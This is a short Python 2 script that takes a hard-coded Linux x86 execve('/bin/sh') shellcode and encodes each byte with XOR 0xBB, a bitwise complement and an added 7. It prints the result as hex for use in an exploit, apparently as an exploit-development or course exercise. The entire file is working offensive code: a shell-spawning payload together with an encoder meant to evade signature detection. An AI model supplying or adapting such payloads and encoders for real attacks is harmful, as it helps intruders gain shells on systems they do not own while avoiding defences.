#!/usr/bin/python

s = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoding = ""

for x in bytearray(s) :
	
	# triple encoding 
	
	y = x^0xBB	# XOR with 0xBB
        z = ~y		# complementing
	t = z+7	        # adding 7

	encoding += '0x'
	encoding += '%02x,' %  (t & 0xff)

print encoding

print 'Lenght: %d' % len(bytearray(s))